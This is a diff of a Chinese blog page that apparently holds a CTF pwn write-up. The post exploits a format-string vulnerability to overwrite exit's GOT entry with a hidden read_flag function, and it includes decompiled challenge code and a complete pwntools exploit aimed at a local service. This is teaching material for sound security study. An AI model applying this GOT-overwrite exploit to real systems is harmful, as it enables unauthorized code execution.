@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/666.jpg">
-  <link rel="icon" href="/img/666.jpg">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/roxy.jpg">
+  <link rel="icon" href="/img/roxy.jpg">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://rr00xxyy.github.io/images/6.png">
 <meta property="article:published_time" content="2025-12-29T17:43:49.000Z">
-<meta property="article:modified_time" content="2026-04-15T16:07:37.087Z">
+<meta property="article:modified_time" content="2026-06-28T18:22:51.138Z">
 <meta property="article:author" content="roxy">
 <meta property="article:tag" content="fmt">
 <meta property="article:tag" content="ret2GOT">
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.5k 字
+          2.4k 字
         
       </span>
     
@@ -277,35 +277,26 @@
                 
                 <p>题目:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_118 [<span class="hljs-number">264</span>];<br>  undefined8 local_10;<br>  <br>  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  setup();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tell me what you want to say:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&gt; &quot;</span>);<br>  builtin_strncpy(local_118,<span class="hljs-string">&quot;That\&#x27;s what you want to say...    &quot;</span>,<span class="hljs-number">0x23</span>);<br>  read(<span class="hljs-number">0</span>,local_118 + <span class="hljs-number">0x22</span>,<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">printf</span>(local_118);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nthat\&#x27;s it? boring... bye&quot;</span>);<br>  FUN_00401140(<span class="hljs-number">1</span>);<br>  halt_baddata();<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>还悄悄藏了一个函数</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">read_flag</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  FILE *__stream;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">72</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;flag not found! Contact admin if you see this on the remote server.&quot;</span>);<br>    FUN_00401140(<span class="hljs-number">1</span>);<br>  &#125;<br>  fgets(local_58,<span class="hljs-number">0x40</span>,__stream);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;How you do that... here is the flag:  %s\n&quot;</span>,local_58);<br>  fclose(__stream);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>保护为<code>NX</code>和<code>canary found</code>，但是不好意思，今天不打返回地址，注意到题目存在格式化字符串漏洞，同时保护为<code>partial RELRO</code>，因此<code>GOT</code>表可写，直接利用%n任意写覆盖exit的<code>GOT</code>表地址为<code>read_flag</code>即可</p>
 <p>在此之前，你可能需要一些前置知识</p>
 <p>1.什么是格式化字符串漏洞，本人词不达意，还请参考如下链接(直接点，放心)</p>
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmt</a></p>
-<p>(2026.2.11复盘时吐槽:你不是词不达意，你是懒得写…)</p>
-<p>2.什么是got表，什么是plt，动态链接器(ld)和共享库是什么，程序第一次调用<code>puts</code>这个函数时到底发生了什么，想必经过ret2libc的洗礼，前两个问题的答案你已知晓，但是后两个问题将回到更底层的维度，等待着你去探索(我也在探索中…)，也许我后面会写一篇关于此和ret2dlresolve的文章，等我先沉淀沉淀吧…</p>
+<p>2.什么是got表，什么是plt，动态链接器(ld)和共享库是什么，程序第一次调用<code>puts</code>这个函数时到底发生了什么，想必经过ret2libc的洗礼，前两个问题的答案你已知晓，但是后两个问题将回到更底层的维度，等待着你去探索(我也在探索中...)，也许我后面会写一篇关于此和ret2dlresolve的文章，等我先沉淀沉淀吧...</p>
 <p>还是回到题目本身</p>
 <p>先观察我们格式化字符的写入点</p>
 <p><img src="/images/6.png" srcset="/img/loading.gif" lazyload alt="qwq"></p>
 <p>可以看到，我们的<code>AAAA</code>从第十个<code>%p</code>的第低三位个字节开始写起，我们的目标是将exit的got(0x403430)覆写为read_flag(0x401236)，采用<code>%hhn</code>逐字节写的方式</p>
-<p>先将0x403430的最低字节0x30覆写为0x36(注意小端序地址表示法)，注意<code>builtin_strncpy(local_118,&quot;That\&#39;s what you want to say...    &quot;,0x23);</code>已经给了<code>local_118</code>34字节的长度，所以再补20个字节得到0x36(54)便可达到目的</p>
+<p>先将0x403430的最低字节0x30覆写为0x36(注意小端序地址表示法)，注意<code>builtin_strncpy(local_118,&quot;That\'s what you want to say...    &quot;,0x23);</code>已经给了<code>local_118</code>34字节的长度，所以再补20个字节得到0x36(54)便可达到目的</p>
 <p>然后将0x403431，即第低二位字节0x34覆写为0x12即可，注意此时<code>local_118</code>的长度已经是54，而目标是0x12(18)，因此先补202个字节至256(你懂的)，再补18个字节回到0x12，一共220个字节，便成功覆写了exit的<code>GOT</code>为<code>read_flag</code></p>
 <p>先大致写出payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload  = <span class="hljs-string">b&#x27;%20x%?$hhn%220x%?$hhn&#x27;</span><br></code></pre></td></tr></table></figure>
-
-<p>?即写入地址0x403430和0x403431的位置，我们推理一下，首先?必定为两位数，因此payload所占字节长度为<code>23</code>，而我们输入的字符从第十个<code>%p</code>的第低三位个字节开始写起，因此发送payload后先是6个字节写完了10，而后还有17个字节分别完了11，12，并写了13的1个字节，因此再补7个字节的长度填满13，最后输入要覆写的地址0x403430，0x403431即在14，15的位置，真是一场酣畅淋漓的构造啊…</p>
-<p>当时的我只是傻傻地对着wp猜偏移，经过很长时间的分析才终于理解了本质，现在写下来，希望能帮到困惑的你…</p>
-<p>最后贴一下完整exp(真的很短，但是也真的很值得深思…)</p>
+<p>?即写入地址0x403430和0x403431的位置，我们推理一下，首先?必定为两位数，因此payload所占字节长度为<code>23</code>，而我们输入的字符从第十个<code>%p</code>的第低三位个字节开始写起，因此发送payload后先是6个字节写完了10，而后还有17个字节分别完了11，12，并写了13的1个字节，因此再补7个字节的长度填满13，最后输入要覆写的地址0x403430，0x403431即在14，15的位置，真是一场酣畅淋漓的构造啊...</p>
+<p>当时的我只是傻傻地对着wp猜偏移，经过很长时间的分析才终于理解了本质，现在写下来，希望能帮到困惑的你...</p>
+<p>最后贴一下完整exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>os = <span class="hljs-string">&quot;linux&quot;</span><br><span class="hljs-comment">#p = process(&#x27;./fmt_got&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46677</span>)<br><br>payload  = <span class="hljs-string">b&#x27;%20x%14$hhn%220x%15$hhn&#x27;</span><br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span><br>payload += p64(<span class="hljs-number">0x403430</span>) + p64(<span class="hljs-number">0x403431</span>)<br><br>p.sendafter(<span class="hljs-string">b&#x27;\n&gt; &#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-<p>好了，又写一篇，感谢阅读，天天开心…</p>
-<p>2026.2.12吐槽:</p>
-<p>虽然写得挺唐</p>
-<p>不过好在思路是正确的…</p>
-<p>不要问我为什么这么多<code>...</code></p>
+<p>好了，又写一篇，感谢阅读，天天开心...</p>
 
                 
               </div>
@@ -378,7 +369,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年4月16日</div>
+          <div>2026年6月29日</div>
         </div>
       
       
@@ -529,7 +520,7 @@
     <div class="footer-inner">
   
     <div class="footer-content">
-      <span class="footer-quote">No furry, no life!</span>
+      <span class="footer-quote">nice to meet you</span>
     </div>
   
   
